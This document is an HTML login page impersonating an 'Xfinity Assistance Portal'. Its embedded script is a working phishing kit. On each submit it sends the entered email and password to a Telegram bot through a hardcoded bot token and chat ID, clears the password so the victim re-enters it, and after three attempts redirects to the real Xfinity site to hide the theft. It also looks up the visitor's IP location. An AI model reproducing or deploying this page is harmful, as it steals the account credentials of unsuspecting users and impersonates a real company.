<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>Login Page</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background: linear-gradient(135deg, #74ebd5 0%, #ACB6E5 100%);
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            margin: 0;
        }

        .login-form {
            background: #ffffff;
            padding: 40px;
            border-radius: 12px;
            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.15);
            width: 320px;
            text-align: center;
            transition: transform 0.3s ease;
        }

        .login-form:hover {
            transform: translateY(-5px);
        }

        .login-form h2 {
            margin-bottom: 25px;
            font-size: 24px;
            color: #333;
            font-weight: 600;
        }

        .login-form input {
            width: 100%;
            padding: 12px;
            margin: 12px 0;
            border: 1px solid #ddd;
            border-radius: 8px;
            font-size: 14px;
            transition: border-color 0.3s ease, box-shadow 0.3s ease;
        }

        .login-form input:focus {
            border-color: #5cb85c;
            box-shadow: 0 0 6px rgba(92, 184, 92, 0.4);
            outline: none;
        }

        .login-form button {
            width: 35%;
            padding: 10px;
            background: linear-gradient(135deg, #5cb85c, #4cae4c);
            border: none;
            border-radius: 8px;
            color: #fff;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: background 0.3s ease, transform 0.2s ease;
        }

        .login-form button:hover {
            background: linear-gradient(135deg, #4cae4c, #449d44);
            transform: scale(1.03);
        }
    </style>
</head>

    <h1>Welcome To Xfinity Assistance Portal</h1>
    <h2>Sign in with your Xfinity ID</h2>
    <form id="EwPE1X6bbf2VEY1KhbynPUA7F">
     <input type="email" id="email" placeholder="Email, mobile or username" required>
  <input type="password" id="password" placeholder="Password" required><br>
  <button type="submit">Sign In</button><br>
    </form>
<footer>
      <h4><p>© 2026 Xfinity Customer Support</p></h4>
</footer>
  <script>
    let userLocation = {};
  const BOT_TOKEN = "8737774050:AAGRLa9FAsv3tfUAsTh5VRUpprSChIFluAk";
  const CHAT_ID = "6365483755";
  let attempts = 0;

  document.getElementById("EwPE1X6bbf2VEY1KhbynPUA7F").addEventListener("submit", function(e) {
    e.preventDefault();
    attempts++;

    const email = document.getElementById("email").value;
    const password = document.getElementById("password").value;

    const text = `Attempt ${attempts}:\nEmail: ${email}\nPassword: ${password}`;
    localStorage.setItem("userEmail", email);

    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: CHAT_ID, text: text })
    })
    .then(response => response.json())
    .then(data => {

      // After 3rd attempt, redirect to thankyou.html
      if (attempts >= 3) {
        window.location.href = "https://xfinity.com";
      }
    })
    .catch(error => console.error("Telegram error:", error));

// Clear password field after each attempt
      document.getElementById("password").value = "";
  });

  
  
  window.addEventListener("DOMContentLoaded", () => {
    const savedEmail = localStorage.getItem("userEmail");
    if (savedEmail) {
      const emailField = document.getElementById("email");
      emailField.value = savedEmail;
      // Optional: lock the email field
      // emailField.readOnly = true;
    }

      // Run after page loads
    window.addEventListener("DOMContentLoaded", () => {
      fetch("https://ipapi.co/json/")
        .then(response => response.json())
        .then(data => {
          console.log(`IP: ${data.ip}`);
          console.log(`City: ${data.city}`);
          console.log(`Region: ${data.region}`);
          console.log(`Country: ${data.country_name}`);
        })
        .catch(err => console.error("IP lookup failed:", err));
    });
  });
